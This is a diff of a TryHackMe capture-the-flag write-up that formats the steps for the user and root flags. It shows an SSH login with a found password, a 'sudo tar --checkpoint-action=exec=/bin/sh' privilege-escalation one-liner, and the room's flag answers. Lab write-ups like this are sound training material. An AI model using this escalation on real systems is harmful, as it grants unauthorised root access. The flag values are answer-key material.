@@ -47,6 +47,7 @@ RedDr4gonSynd1cat3
 ```
 
 ## 6. user.txt  
+### use `ssh lin@mahineip` and then press `enter` and the password we found !
 <p align="center">
   <img width="1057" height="346" alt="image" src="https://github.com/user-attachments/assets/743b5da8-0bfc-4d95-bd17-1b38c6a9364b" />
 </p>
@@ -63,5 +64,13 @@ THM{CR1M3_SyNd1C4T3}
 sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
-8. root.txt  
+## 8. root.txt  
+<p align="center">
+  <img width="1007" height="206" alt="image" src="https://github.com/user-attachments/assets/b19c81c1-f0c8-4475-8468-164ec11c4b81" />
+</p>
+
+```
 THM{80UN7Y_h4cK3r}  
+```
+
+Completed Room 
